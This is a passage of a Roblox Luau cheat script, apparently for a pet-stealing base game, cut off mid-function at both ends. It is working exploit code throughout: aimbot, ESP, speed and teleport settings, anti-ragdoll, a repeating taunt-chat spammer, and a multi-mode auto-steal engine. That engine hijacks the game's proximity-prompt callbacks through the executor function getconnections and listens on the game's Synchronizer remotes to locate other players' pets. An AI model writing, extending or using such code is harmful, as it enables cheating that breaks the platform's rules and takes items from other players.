    _G.BlastTauntQueue = (_G.BlastTauntQueue or 0) + 1
    if _G.BlastTauntWorkerRunning then return end
    _G.BlastTauntWorkerRunning = true
    task.spawn(function()
        while (_G.BlastTauntQueue or 0) > 0 do
            _G.BlastTauntQueue = _G.BlastTauntQueue - 1
            for index = 1, (_G.BlastTauntRepeatCount or 3) do
                _G.BlastSendTauntChatMessage()
                if index < (_G.BlastTauntRepeatCount or 3) then
                    task.wait(_G.BlastTauntMessageDelay or 0.35)
                end
            end
            if (_G.BlastTauntQueue or 0) > 0 then
                task.wait(_G.BlastTauntMessageDelay or 0.35)
            end
        end
        _G.BlastTauntWorkerRunning = false
    end)
end

-- ============================================================
-- STATE
-- ============================================================
-- Primeira execução: tamanho mostrado na referência (320x520 em escala 0.75)
local DEFAULT_GUI_SCALE = 0.75

local State = {
    VLESSVSSemiStopPercent = 75,
    infJumpEnabled=true, antiRagdollEnabled=false, antiRagdollMode="V1", antiDieEnabled=true, antiLagEnabled=false,
    guiVisible=true, uiLocked=false,
    isStealing=false, stealStartTime=nil, lastStealTick=0,
    medusaLastUsed=0, medusaDebounce=false, medusaCounterEnabled=false, antiMedusaEnabled=false,
    noCollideEnabled=false,
    batCounterEnabled=false, batCounterDebounce=false,
    lastMoveDir=Vector3.new(0,0,0),
    unwalkEnabled=false,
    autoStealEnabled=false,

    countdownActive=false,
    stretchRezEnabled=true,
    fovEnabled=false, fovValue=70,
    nightModeEnabled=true,
    autoLeftEnabled=false, autoRightEnabled=false,
    autoLeftPhase=1, autoRightPhase=1,

    gameTheme = "Off", -- Theme from HOKAGE.TXT
    removeAccEnabled=true,
    uiLocked=false,
    batAimbotToggled = false,
    autoSwingEnabled = true,
    hittingCooldown = false,
    stealsCount = 0,
    AimbotSpeed = 56.5,
    BypassSpeed = 58,
    HitDistance = 5,
    SwingCooldown = 0.08,
    aimbotMode = "normal", -- "normal" or "antiBatBypass"
    batAimbotVersion = "v1", -- compatibility: last active version
    normalAimbotVersion = "v1",
    bypassAimbotVersion = "v1",
    antiBatEnabled = false, -- VX7 velocity spoof Anti Bat
    adaptStealMode = "NORMAL", -- NORMAL | SEMI
    adaptSemiRange = 10,
    adaptNormalPause = 65,
    aimbotConnection = nil,
    tpBatEnabled = false,
    guiPosition = {X = {Scale = 0, Offset = 8}, Y = {Scale = 0, Offset = 8}},
    miniGuiPosition = {X = {Scale = 1, Offset = -128}, Y = {Scale = 0, Offset = 28}},
    autoGrabPosition = {X = {Scale = 0.5, Offset = 0}, Y = {Scale = 1, Offset = -10}},
    lockAutoGrab = false,
    mobileButtonPositions = {},
    mobileButtonScale = 1.00,
    hideMobileButtons = false, lockMobileButtons = false,
    noCamCollisionEnabled = false,
    customFontEnabled = false,
    visionBatToggled = false,
    snowTpBatEnabled = false,
    tpBatMode = "v1",
    espEnabled = false,
    espMode = "noLine",
    currentBackground = 1, -- 0 = None, padrao: Background 1
    colorTags = {}, -- labels (discord .gg) que seguem a cor da paleta
    backgroundColorEnabled = true, -- tint rosa/roxo ativo por padrao
    backgroundColor = "PINK",       -- nome da cor selecionada na paleta (rosa/roxo default)
    uiScale = DEFAULT_GUI_SCALE,
    progressBarScale = 1.00,
    laggerUiScale = 1.00,
    laggerOpen = false,
    animationPack = "OFF",
    headlessEnabled = false,
    korbloxEnabled = false,
    skinEnabled = false,
    skinSelection = 1, -- index in SKIN_LIST
    customToolsEnabled = false,
}

function _G.BlastPositionToConfig(position)
    if typeof(position) ~= "UDim2" then return nil end
    return {
        X = {Scale = position.X.Scale, Offset = position.X.Offset},
        Y = {Scale = position.Y.Scale, Offset = position.Y.Offset},
    }
end

function _G.BlastConfigToPosition(data, fallback)
    if type(data) ~= "table" then return fallback end
    local x = type(data.X) == "table" and data.X or {}
    local y = type(data.Y) == "table" and data.Y or {}
    return UDim2.new(
        tonumber(x.Scale) or fallback.X.Scale,
        tonumber(x.Offset) or fallback.X.Offset,
        tonumber(y.Scale) or fallback.Y.Scale,
        tonumber(y.Offset) or fallback.Y.Offset
    )
end

local ESP = {
    Objects = {}, -- Key: Player, Value: { highlight = Highlight, lineFrame = Frame, lineStroke = UIStroke }
    Connection = nil,
    SetVisual = nil,
    gui = nil
}

function _G.BlastCleanupOldESPVisuals()
    for _, player in ipairs(Players:GetPlayers()) do
        local character = player.Character
        if character then
            for _, existing in ipairs(character:GetDescendants()) do
                if existing:IsA("BillboardGui") and (existing.Name == "MiseryESP_Avatar" or existing.Name == "EnemySpeedGui") then
                    pcall(function() existing:Destroy() end)
                end
            end
        end
    end
    for _, existing in ipairs(workspace:GetChildren()) do
        if existing:IsA("Highlight") and existing.Name == "NoxyESP_HL" then
            pcall(function() existing:Destroy() end)
        end
    end
end
_G.BlastCleanupOldESPVisuals()

-- (Old speed system removed here — replaced by the Smoke Hub speed system below)


-- Mobile buttons globals
_G._VezyHideSideBtns = _G._VezyHideSideBtns or false
_G._VynxMobileBtnScale = _G._VynxMobileBtnScale or 1.0



local antiLagDescConn = nil
local antiLagActive = false
local antiLagDefBrightness, antiLagDefFog, antiLagDefDiffuse, antiLagDefSpecular

local function _applyAntiLagObj(obj)
    pcall(function()
        if obj:IsA("BasePart") then
            obj.Material = Enum.Material.Plastic; obj.Reflectance = 0; obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 1
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
        or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            -- Skin smoke that was enabled in the original asset must survive Anti Lag.
            if not obj:GetAttribute("BlastPreserveSkinSmoke") then
                obj.Enabled = false
            end
        elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
            for _,t in ipairs(obj:GetPlayingAnimationTracks()) do pcall(function() t:Stop(0) end) end
        end
    end)
end

local function enableAntiLag()
    antiLagActive = true
    antiLagDefBrightness = antiLagDefBrightness or Lighting.Brightness
    antiLagDefFog        = antiLagDefFog        or Lighting.FogEnd
    antiLagDefDiffuse    = antiLagDefDiffuse    or Lighting.EnvironmentDiffuseScale
    antiLagDefSpecular   = antiLagDefSpecular   or Lighting.EnvironmentSpecularScale
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e10
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0
    for _,e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
            or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled = false end
        end)
    end
    for _,obj in ipairs(workspace:GetDescendants()) do _applyAntiLagObj(obj) end
    if antiLagDescConn then antiLagDescConn:Disconnect() end
    antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
        if antiLagActive then _applyAntiLagObj(obj) end
    end)
end

local function disableAntiLag()
    antiLagActive = false
    if antiLagDescConn then antiLagDescConn:Disconnect(); antiLagDescConn = nil end
    pcall(function()
        Lighting.GlobalShadows = true
        if antiLagDefBrightness then Lighting.Brightness = antiLagDefBrightness end
        if antiLagDefFog        then Lighting.FogEnd = antiLagDefFog end
        if antiLagDefDiffuse    then Lighting.EnvironmentDiffuseScale = antiLagDefDiffuse end
        if antiLagDefSpecular   then Lighting.EnvironmentSpecularScale = antiLagDefSpecular end
        for _,e in pairs(Lighting:GetChildren()) do
            pcall(function()
                if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
                or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled = true end
            end)
        end
    end)
end

local Keys = {
    carry      = Enum.KeyCode.Q,
    lagger     = Enum.KeyCode.R,
    drop       = Enum.KeyCode.H,
    tpDown     = Enum.KeyCode.V,
    aimbot     = Enum.KeyCode.E,
    batBypass  = Enum.KeyCode.Unknown,
    batT       = Enum.KeyCode.Unknown,
    unwalk     = Enum.KeyCode.U,
    autoLeft   = Enum.KeyCode.L,
    autoRight  = Enum.KeyCode.R,
    guiHide    = Enum.KeyCode.LeftControl,
    visionBat  = Enum.KeyCode.E,
}

-- Auto Steal Variables from Standalone
local isCurrentlyStealing = false
local autoGrabStopEnabled = false
local autoGrabStopTime = 1.29
local autoGrabDelayRadius = 8
local autoStealConnection = nil
local barResetTween = nil

local Steal = {
    AutoStealEnabled = false,
    StealRadius = 70,
    StealDuration = 1.25,
    Data = {},
    -- Aliases for backward compatibility
    AutoGrabStopEnabled = false,
    AutoGrabStopTime = 1.29,
    AutoGrabDelayRadius = 8,
}

-- Keep Steal's aliases synced with the global variables
local function syncStealAliases()
    Steal.AutoGrabStopEnabled = autoGrabStopEnabled
    Steal.AutoGrabStopTime = autoGrabStopTime
    Steal.AutoGrabDelayRadius = autoGrabDelayRadius
end

-- ============================================================
-- SMOKE → BLAST: AMBITIOUS MULTI-MODE AUTO STEAL (Normal / Semi / SemiV2)
-- Port completo do SmokeHub. Não altera outros sistemas do Blast.
-- ============================================================
autoStealEnabled = false
selectedStealMode = selectedStealMode or "Normal"
selectedSemiMode = selectedSemiMode == "V2" and "V2" or "V1"
autoStealRadius = tonumber(autoStealRadius) or 70
_G.AmbitiousStealRadii = _G.AmbitiousStealRadii or {Normal = 70, Semi = 68, SemiV2Radius = 68, SemiV2SemiRadius = 10}
_G._AmbitiousKickWarn = _G._AmbitiousKickWarn or {enabled=false, wasLow=false, active=false, gen=0}

-- Bridge StealBar → Blast progress bar (created later; functions tolerate nil)
_G.StealBar = _G.StealBar or {}
local function _BSB() return _G.BlastStealProgressBar end
function _G.StealBar.SetProgress(p)
    p = math.clamp(tonumber(p) or 0, 0, 1)
    _G.BlastStealProgress = p
    pcall(function()
        local bar = _BSB()
        if not bar then return end
        if bar.progressFill then bar.progressFill.Size = UDim2.new(p, 0, 1, 0) end
        if bar.progressPct then bar.progressPct.Text = string.format("%d%%", math.floor(p * 100 + 0.5)) end
        if bar.pbFrame and p > 0 and not bar.pbFrame.Visible then bar.pbFrame.Visible = true end
    end)
end
function _G.StealBar.SetState(s)
    pcall(function()
        local bar = _BSB()
        if not bar then return end
        if bar.pbFrame and s then bar.pbFrame.Visible = true end
        if bar.statusLbl and type(s) == "string" then
            bar.statusLbl.Text = string.upper(s)
        end
    end)
end
function _G.StealBar.Reset()
    pcall(function() _G.StealBar.SetProgress(0) end)
end
function _G.StealBar.SetEnabled(on)
    pcall(function()
        local bar = _BSB()
        if bar and bar.pbFrame then bar.pbFrame.Visible = on and true or false end
    end)
end

-- Export locals the Ambitious loadstring needs (it runs in global env)
_G._VLESSVSGrabState = State
_G.autoGrabDelayRadius = autoGrabDelayRadius
_G.LP = LP
_G.Players = Players
_G.RunService = RunService
_G.getconnections = getconnections
_G.autoStealEnabled = autoStealEnabled
_G.selectedStealMode = selectedStealMode
_G.selectedSemiMode = selectedSemiMode
_G.autoStealRadius = autoStealRadius

do
    local _src = [[
local LP = (rawget(_G, "LP") or game:GetService("Players").LocalPlayer)
local Players = rawget(_G, "Players") or game:GetService("Players")
local RunService = rawget(_G, "RunService") or game:GetService("RunService")
local State = rawget(_G, "_VLESSVSGrabState") or {}
local getconnections = rawget(_G, "getconnections") or get_signal_cons or getconnects or (syn and syn.get_signal_cons)
-- Read mode flags from _G each time engines check (engines capture upvalues; re-sync in Sync)
do
  -- nothing: engines read selectedStealMode as global upvalue from load env
end

_G.__AmbitiousSetupNormalAutoSteal = function()
  _G.AmbitiousNormalSteal = _G.AmbitiousNormalSteal or {
    enabled = false,
    radius = 70,
    duration = 1.25,
    animals = {},
    promptCache = {},
    internalCache = {},
    scannerStarted = false,
    scanning = false,
    isStealing = false,
    stealConn = nil,
    refreshThread = nil,
    lastSteal = 0,
    cooldown = 0.02,
  }
  if _G.AmbitiousNormalSteal.stealConn then pcall(function() _G.AmbitiousNormalSteal.stealConn:Disconnect() end); _G.AmbitiousNormalSteal.stealConn = nil end
  _G.AmbitiousNormalSteal.enabled = false
  _G.AmbitiousNormalSteal.isStealing = false

  local function barProgress(p)
    p = math.clamp(tonumber(p) or 0, 0, 1)
    pcall(function()
      if _G.StealBar then
        _G.StealBar.SetState("STEALING")
        _G.StealBar.SetProgress(p)
      end
    end)
  end

  local function resetBar()
    pcall(function()
      if _G.StealBar then _G.StealBar.Reset() end
    end)
  end

  local function getRoot()
    local char = LP.Character
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")
  end

  local function isMyBase(plotName)
    local plots = workspace:FindFirstChild("Plots")
    local plot = plots and plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    local yourBase = sign and sign:FindFirstChild("YourBase")
    return yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled == true
  end

  local function scanPlots()
    local a = _G.AmbitiousNormalSteal
    a.animals = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return end
    for _, plot in ipairs(plots:GetChildren()) do
      if plot:IsA("Model") and not isMyBase(plot.Name) then
        local podiums = plot:FindFirstChild("AnimalPodiums")
        if podiums then
          for _, podium in ipairs(podiums:GetChildren()) do
            if podium:IsA("Model") then
              local base = podium:FindFirstChild("Base")
              local spawn = base and base:FindFirstChild("Spawn")
              if spawn then
                table.insert(a.animals, {
                  plot = plot.Name,
                  slot = podium.Name,
                  worldPosition = spawn.Position,
                  uid = plot.Name .. "_" .. podium.Name,
                })
              end
            end
          end
        end
      end
    end
  end

  local function ensureScanner()
    local a = _G.AmbitiousNormalSteal
    if a.scannerStarted then return end
    a.scannerStarted = true
    task.spawn(function()
      task.wait(1)
      while _G.AmbitiousNormalSteal do
        if _G.AmbitiousNormalSteal.enabled then
          pcall(scanPlots)
        end
        task.wait(1.5)
      end
    end)
  end

  local function findPrompt(data)
    if not data then return nil end
    local a = _G.AmbitiousNormalSteal
    local cached = a.promptCache[data.uid]
    if cached and cached.Parent then return cached end
    local plots = workspace:FindFirstChild("Plots")
    local plot = plots and plots:FindFirstChild(data.plot)
    local podiums = plot and plot:FindFirstChild("AnimalPodiums")
    local podium = podiums and podiums:FindFirstChild(data.slot)
    local base = podium and podium:FindFirstChild("Base")
    local spawn = base and base:FindFirstChild("Spawn")
    local attach = spawn and spawn:FindFirstChild("PromptAttachment")
    if not attach then return nil end
    for _, prompt in ipairs(attach:GetChildren()) do
      if prompt:IsA("ProximityPrompt") then
        a.promptCache[data.uid] = prompt
        return prompt
      end
    end
    return nil
  end

  local function cacheCallbacks(prompt)
    local a = _G.AmbitiousNormalSteal
    if a.internalCache[prompt] then return end
    local data = {hold = {}, trigger = {}, ready = true}
    pcall(function()
      if getconnections then
        for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
          if type(conn.Function) == "function" then table.insert(data.hold, conn.Function) end
        end
        for _, conn in ipairs(getconnections(prompt.Triggered)) do
          if type(conn.Function) == "function" then table.insert(data.trigger, conn.Function) end
        end
      end
    end)
    if #data.hold > 0 or #data.trigger > 0 then
      a.internalCache[prompt] = data
    end
  end

  -- Stesso identico check delle modalita' Semi: distanza dal prompt vivo
  -- (prompt.Parent.Parent = la parte Spawn), non da una posizione salvata.
  local function stillInRange(prompt)
    local a = _G.AmbitiousNormalSteal
    local root = getRoot()
    if not root or not prompt.Parent or not prompt.Parent.Parent then return false end
    return (root.Position - prompt.Parent.Parent.Position).Magnitude <= (tonumber(a.radius) or 62)
  end

  local function doSteal(prompt)
    local a = _G.AmbitiousNormalSteal
    if not prompt or not prompt.Parent or a.isStealing then return end
    if tick() - (a.lastSteal or 0) < (a.cooldown or 0.08) then return end
    cacheCallbacks(prompt)
    local data = a.internalCache[prompt]
    if not data or not data.ready then return end
    if _G.SyncAfterHitReady and not _G.SyncAfterHitReady() then return end
    data.ready = false
    a.isStealing = true
    a.lastSteal = tick()
    pcall(function() if _G.StealBar then _G.StealBar.SetState("STEALING") end end)
    task.spawn(function()
      if #data.hold > 0 then
        for _, fn in ipairs(data.hold) do task.spawn(function() pcall(fn) end) end
      end
      local startTime = tick()
      local dur = tonumber(a.duration) or 1.25
      a.duration = dur
      -- La barra si riempie in 1.25s e resta piena per gli ultimi 0.05s:
      -- cosi' il 100% e' visibile invece di comparire nello stesso frame del reset.
      local fillDur = math.max(dur - 0.05, 0.05)
      local aborted = false
      while a.enabled and selectedStealMode == "Normal" and tick() - startTime < dur do
        if not stillInRange(prompt) then
          aborted = true
          break
        end
        barProgress((tick() - startTime) / fillDur)
        task.wait(0.01)
      end
      if aborted or not a.enabled or selectedStealMode ~= "Normal" then
        data.ready = true
        a.isStealing = false
        resetBar()
        return
      end
      barProgress(1)
      if #data.trigger > 0 then
        for _, fn in ipairs(data.trigger) do task.spawn(function() pcall(fn) end) end
      end
      pcall(function() if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end end)
      -- nessun wait: ripartenza immediata al prossimo Heartbeat
      data.ready = true
      a.isStealing = false
      resetBar()
    end)
  end

  local function nearestAnimal()
    local a = _G.AmbitiousNormalSteal
    local root = getRoot()
    if not root then return nil end
    local radius = tonumber(a.radius) or 62

    -- STESSA SCELTA DEL BERSAGLIO DELLA SEMI.
    -- Prima si guardava la lista costruita dallo scan della Normal, che
    -- contiene TUTTI i podi (anche quelli vuoti), e si usava la
    -- worldPosition salvata al momento della scansione. Due problemi in
    -- uno: si prendeva di mira un podio senza niente sopra, e anche
    -- quando l'animale spariva la posizione vecchia restava buona,
    -- quindi lo steal partiva lo stesso a vuoto.
    -- La lista della Semi nasce invece dall'AnimalList del plot (solo
    -- slot davvero occupati) e la posizione viene risolta ADESSO dal
    -- podio: se non c'e' piu' niente, animalPos ritorna nil e quella
    -- voce non e' un bersaglio.
    -- #list > 0 e non solo "e' una tabella": lo scan condiviso ci mette un
    -- attimo a partire (aspetta ReplicatedStorage), e con la lista ancora
    -- vuota si usciva subito senza bersaglio invece di ripiegare sulla
    -- scansione propria. Era per quello che la Normal sembrava morta
    -- finche' non passavi da Semi e tornavi indietro.
    if _G.AmbitiousStealAnimals then
      local list = _G.AmbitiousStealAnimals()
      if type(list) == "table" and #list > 0 then
        local best, bestDist = nil, math.huge
        for _, data in ipairs(list) do
          local mine = _G.AmbitiousStealIsMyBase and _G.AmbitiousStealIsMyBase(data)
          local occupied = (not _G.AmbitiousStealSlotOccupied)
                           or _G.AmbitiousStealSlotOccupied(data)
          if not mine and occupied then
            local pos = _G.AmbitiousStealAnimalPos and _G.AmbitiousStealAnimalPos(data)
            if pos then
              local dist = (root.Position - pos).Magnitude
              if dist <= radius and dist < bestDist then
                best, bestDist = data, dist
              end
            end
          end
        end
        return best
      end
    end

    -- Ripiego: la Semi non e' ancora stata inizializzata. Anche qui la
    -- posizione si risolve dal vivo, non dalla worldPosition salvata.
    local best, bestDist = nil, math.huge
    for _, data in ipairs(a.animals) do
      if not isMyBase(data.plot) then
        local plots = workspace:FindFirstChild("Plots")
        local plot = plots and plots:FindFirstChild(data.plot)
        local podiums = plot and plot:FindFirstChild("AnimalPodiums")
        local podium = podiums and podiums:FindFirstChild(data.slot)
        if podium then
          local dist = (root.Position - podium:GetPivot().Position).Magnitude
          if dist <= radius and dist < bestDist then
            best, bestDist = data, dist
          end
        end
      end
    end
    return best
  end

  _G.AmbitiousNormalAutoStealSetRadius = function(v)
    _G.AmbitiousNormalSteal.radius = tonumber(v) or _G.AmbitiousNormalSteal.radius or 62
  end

  _G.AmbitiousNormalAutoStealStop = function()
    local a = _G.AmbitiousNormalSteal
    a.enabled = false
    a.isStealing = false
    if a.stealConn then a.stealConn:Disconnect(); a.stealConn = nil end
    resetBar()
  end

  _G.AmbitiousNormalAutoStealStart = function()
    if _G.SyncAfterHitReady and not _G.SyncAfterHitReady() then return end
    local a = _G.AmbitiousNormalSteal
    a.radius = tonumber(autoStealRadius) or a.radius or 70
    a.duration = 1.25
    a.enabled = true
    ensureScanner()
    pcall(scanPlots)
    -- Lista condivisa con la Semi: va fatta partire, se no resta vuota e
    -- nearestAnimal non ha niente su cui lavorare.
    if _G.AmbitiousStealEnsureScan then pcall(_G.AmbitiousStealEnsureScan) end
    if a.stealConn then a.stealConn:Disconnect(); a.stealConn = nil end
    a.stealConn = RunService.Heartbeat:Connect(function()
      if not a.enabled then return end
      if selectedStealMode ~= "Normal" then _G.AmbitiousNormalAutoStealStop(); return end
      if a.isStealing then return end
      local target = nearestAnimal()
      if not target then return end
      local prompt = findPrompt(target)
      if prompt then doSteal(prompt) end
    end)
  end

  _G.AmbitiousNormalAutoStealSync = function()
    if selectedStealMode == "Normal" and autoStealEnabled then
      _G.AmbitiousNormalAutoStealStart()
    else
      _G.AmbitiousNormalAutoStealStop()
    end
  end
end

_G.__AmbitiousSetupNormalAutoSteal()

_G.__AmbitiousSetupSemiAutoSteal = function()
  _G.AmbitiousSemiSteal = _G.AmbitiousSemiSteal or {}
  local A = _G.AmbitiousSemiSteal
  if A.conn then pcall(function() A.conn:Disconnect() end); A.conn = nil end
  A.enabled    = false
  A.cooldown   = A.cooldown   or 0.02
  A.primeRange = A.primeRange or 80
  A.radius     = tonumber(autoStealRadius) or A.radius or 60
  -- applica valori salvati dal config (loadAmbitiousConfig gira prima di questo setup)
  local pending = _G._AmbitiousSemiStealPending
  A.autoGrabStopTime       = (pending and pending.autoGrabStopTime)       or A.autoGrabStopTime       or 1.29
  A.autoGrabSetDelayRadius = (pending and pending.autoGrabSetDelayRadius) or A.autoGrabSetDelayRadius or 8
  A.autoGrabStopEnabled    = true
  _G._AmbitiousSemiStealPending = nil


  A.conn = A.conn
  A.scanThread = A.scanThread
  A.plotSync = A.plotSync or {caches = {}, connections = {}}
  A.animals = A.animals or {}
  A.promptCache = A.promptCache or {}
  A.internalCache = A.internalCache or {}
  A.state = A.state or {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0}

  local function barSet(p, label)
    pcall(function()
      if _G.StealBar then
        _G.StealBar.SetState(label or "STEALING")
        _G.StealBar.SetProgress(math.clamp(tonumber(p) or 0, 0, 1))
      end
    end)
  end

  local function barReset()
    pcall(function()
      if _G.StealBar then _G.StealBar.Reset() end
    end)
  end

  local function rootPart()
    local char = LP.Character
    return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")) or nil
  end

  local function splitPath(path)
    if typeof(path) == "table" then return path end
    local out = {}
    for part in string.gmatch(tostring(path), "[^%.]+") do
      table.insert(out, tonumber(part) or part)
    end
    return out
  end

  local function resolvePath(path, root)
    local current, parent, key = root, nil, nil
    for _, part in ipairs(splitPath(path)) do
      parent = current
      key = part
      current = current and current[part] or nil
    end
    return current, parent, key
  end

  local function applySyncDiff(channelName, packet)
    local cache = A.plotSync.caches[channelName]
    if typeof(cache) ~= "table" then return end
    local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
    local current, parent, key = resolvePath(path, cache)
    if action == "Changed" then
      if parent ~= nil then parent[key] = a end
    elseif action == "ArrayInsert" then
      if current ~= nil then table.insert(current, b, a) end
    elseif action == "ArrayRemoved" then
      if current ~= nil then table.remove(current, b) end
    elseif action == "DictionaryInsert" then
      if current ~= nil then current[b] = a end
    elseif action == "DictionaryRemoved" then
      if current ~= nil then current[b] = nil end
    end
  end

  local function attachPlotChannel(remote, plots, requestData)
    if A.plotSync.connections[remote] then return end
    local channelName = tostring(remote.Name)
    if not plots:FindFirstChild(channelName) then return end
    if requestData and A.plotSync.caches[channelName] == nil then
      local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
      A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
    elseif A.plotSync.caches[channelName] == nil then
      A.plotSync.caches[channelName] = {}
    end
    A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
      for _, packet in ipairs(queue) do applySyncDiff(channelName, packet) end
    end)
  end

  local function ensureSync()
    if A.syncReady then return true end
    local ok = pcall(function()
      local rs = game:GetService("ReplicatedStorage")
      A.packages = rs:WaitForChild("Packages", 10)
      A.datas = rs:WaitForChild("Datas", 10)
      A.plots = workspace:WaitForChild("Plots", 10)
      if not (A.packages and A.datas and A.plots) then return end
      A.animalsData = require(A.datas:WaitForChild("Animals", 10))
      local sync = A.packages:WaitForChild("Synchronizer", 10)
      A.channelFolder = sync:WaitForChild("Channel", 10)
      A.routeRemote = sync:WaitForChild("CommunicationRoute", 10)
      A.requestData = sync:FindFirstChild("RequestData")
      for _, child in ipairs(A.channelFolder:GetChildren()) do
        if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
      end
      A.channelFolder.ChildAdded:Connect(function(child)
        if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
      end)
      A.routeRemote.OnClientEvent:Connect(function(actions)
        for _, action in ipairs(actions) do
          local kind, channelName = action[1], tostring(action[2])
          if A.plots and A.plots:FindFirstChild(channelName) then
            if kind == "ListenerAdded" then
              local remote = A.channelFolder and A.channelFolder:FindFirstChild(channelName)
              if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote, A.plots, A.requestData) end
            elseif kind == "ListenerRemoved" then
              for remote, conn in pairs(A.plotSync.connections) do
                if tostring(remote.Name) == channelName then
                  pcall(function() conn:Disconnect() end)
                  A.plotSync.connections[remote] = nil
                  A.plotSync.caches[channelName] = nil
                  break
                end
              end
            end
          end
        end
      end)
      A.syncReady = true
    end)
    return ok and A.syncReady == true
  end

  local function getPlotOwner(plot)
    local sign = plot and plot:FindFirstChild("PlotSign")
    local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
    local label = frame and frame:FindFirstChild("TextLabel")
    if not label or label.Text == "Empty Base" then return nil end
    return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
  end

  local function isMyBaseAnimal(animalData)
    if not animalData or not animalData.plot or not A.plots then return false end
    local plot = A.plots:FindFirstChild(animalData.plot)
    if not plot then return false end
    local owner = getPlotOwner(plot)
    return owner == LP.DisplayName or owner == LP.Name
  end

  local function podiumFor(animalData)
    local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
    local podiums = plot and plot:FindFirstChild("AnimalPodiums")
    return podiums and podiums:FindFirstChild(animalData.slot) or nil
  end

  local function animalPos(animalData)
    local podium = podiumFor(animalData)
    return podium and podium:GetPivot().Position or nil
  end

  local function distToAnimal(animalData)
    local root = rootPart()
    local pos = animalPos(animalData)
    return root and pos and (root.Position - pos).Magnitude or math.huge
  end

  local function findPromptForAnimal(animalData)
    if not animalData then return nil end
    local cached = A.promptCache[animalData.uid]
    if cached and cached.Parent then return cached end
    local podium = podiumFor(animalData)
    local base = podium and podium:FindFirstChild("Base")
    local spawn = base and base:FindFirstChild("Spawn")
    local attach = spawn and spawn:FindFirstChild("PromptAttachment")
    if not attach then return nil end
    for _, prompt in ipairs(attach:GetChildren()) do
      if prompt:IsA("ProximityPrompt") then
        A.promptCache[animalData.uid] = prompt
        return prompt
      end
    end
    return nil
  end

  local function scanAllPlots()
    if not ensureSync() then return 0 end
    local newCache = {}
    for _, plot in ipairs(A.plots:GetChildren()) do
      local cache = A.plotSync.caches[plot.Name]
      local animalList = cache and cache.AnimalList
      if typeof(animalList) == "table" then
        for slot, animalData in pairs(animalList) do
          if type(animalData) == "table" then
            local animalName = animalData.Index
            local info = A.animalsData and A.animalsData[animalName]
            if info then
              table.insert(newCache, {
                name = info.DisplayName or animalName,
                plot = plot.Name,
                slot = tostring(slot),
                uid = plot.Name .. "_" .. tostring(slot),
              })
            end
          end
        end
      end
    end
    A.animals = newCache
    return #newCache
  end

  local function pickClosest()
    local root = rootPart()
    if not root then return nil end
    local best, bestDist = nil, math.huge
    for _, animalData in ipairs(A.animals) do
      if not isMyBaseAnimal(animalData) then
        local pos = animalPos(animalData)
        local dist = pos and (root.Position - pos).Magnitude or math.huge
        if dist <= (A.primeRange or 80) and dist < bestDist then
          best, bestDist = animalData, dist
        end
      end
    end
    return best
  end

  -- ---- lista bersagli condivisa con la modalita' Normal ----
  -- La Normal costruiva una lista sua scorrendo i podi: ci finiva DENTRO
  -- ogni podio esistente, pieno o vuoto che fosse. Questa invece nasce
  -- dall'AnimalList del plot, quindi contiene solo gli slot che hanno
  -- davvero un animale sopra. Esposta su _G perche' il blocco della
  -- Normal sta prima di questo nel file e non vede questi local.
  _G.AmbitiousStealAnimals   = function() return A.animals end
  _G.AmbitiousStealAnimalPos = function(d) return animalPos(d) end
  _G.AmbitiousStealIsMyBase  = function(d) return isMyBaseAnimal(d) end

  -- Lo slot ha ANCORA un animale sopra, adesso.
  -- La lista viene ricostruita ogni 5 secondi, quindi da sola non basta:
  -- un animale appena rubato resta in elenco fino al giro dopo, e il
  -- podio esiste comunque (vuoto), quindi anche la posizione risulta
  -- valida. Le cache dei plot sono invece aggiornate dal vivo dai
  -- RemoteEvent del Synchronizer: chiedendo a loro si sa in quell'istante
  -- se lo slot e' occupato.
  _G.AmbitiousStealSlotOccupied = function(d)
    if not d or not d.plot or not d.slot then return false end
    local cache = A.plotSync and A.plotSync.caches and A.plotSync.caches[d.plot]
    local list = cache and cache.AnimalList
    -- Cache non disponibile: non si puo' dire di no, se no con la sync
    -- non pronta la Normal non partirebbe mai.
    if typeof(list) ~= "table" then return true end
    -- Le chiavi possono essere numeri o stringhe a seconda di come
    -- arrivano dal server: si provano entrambe.
    local entry = list[d.slot] or list[tonumber(d.slot) or -1]
    return type(entry) == "table"
  end

  local function ensureScanThread()
    if A.scanThread then return end
    A.scanThread = task.spawn(function()
      while _G.AmbitiousSemiSteal do
        -- Lo scan gira anche per la Normal, che ora legge da qui.
        if A.enabled or selectedStealMode == "Semi"
           or (selectedStealMode == "Normal" and autoStealEnabled) then
